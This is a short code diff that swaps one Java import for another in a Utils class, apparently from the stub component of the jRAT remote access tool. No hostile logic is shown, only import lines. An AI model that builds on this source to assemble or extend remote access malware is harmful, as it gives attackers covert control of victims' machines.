@@ -15,8 +15,9 @@ import org.w3c.dom.Element;
 import org.w3c.dom.Node;
 import org.w3c.dom.NodeList;
 
-import se.jrat.common.OperatingSystem;
 import se.jrat.stub.Main;
+
+import com.redpois0n.oslib.OperatingSystem;
 
 
 public class Utils {
